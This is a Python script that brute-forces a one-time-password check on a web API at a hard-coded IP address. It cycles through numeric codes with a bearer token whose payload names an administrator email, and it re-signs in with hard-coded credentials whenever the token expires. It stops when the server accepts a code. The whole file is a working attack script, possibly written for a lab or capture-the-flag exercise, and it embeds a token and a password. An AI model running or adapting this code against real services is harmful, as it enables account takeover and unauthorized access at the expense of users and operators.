import requests
import threading
import json

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluaXN0cmF0b3JAZ21haWwuY29tIiwiaWF0IjoxNjc3MzQ3NzUyLCJleHAiOjE2NzczNTEzNTJ9.7IS51-lWzShI_5fy9gvim8NxecTO3yuK33ExX7G7QHI"


for i in range(999999):
    code = f"{i}".zfill(4)
    print(code)
    
    res = requests.post(
        'http://165.227.147.243:8081/api/verify-otp', 
        headers={
            "Authorization": f"Bearer {jwt}"
            ,"x-requestor": "ola",
            "Content-Type": "application/json",
            "Origin": "http://165.227.147.243:8081"
        },

        data= 
            json.dumps({"code": {"code":code}})
        
    )

    

    if "Unauthorized."  in res.text or "jwt" in res.text :
       
        res_auth = requests.post(
        'http://165.227.147.243:8081/api/sign-in', 

        headers= {
            "Content-Type": "application/json",
            "Origin": "http://165.227.147.243:8081"
        },
        data=json.dumps({"user":{"email":"micheal@greenfist.xyz","password":"ola"}})
        )
        print(f"reauth")

        jwt = json.loads(res_auth.text)['token']

    elif "invalid" not in res.text:
        print(code)
        print(res.text)
        exit(1)
        



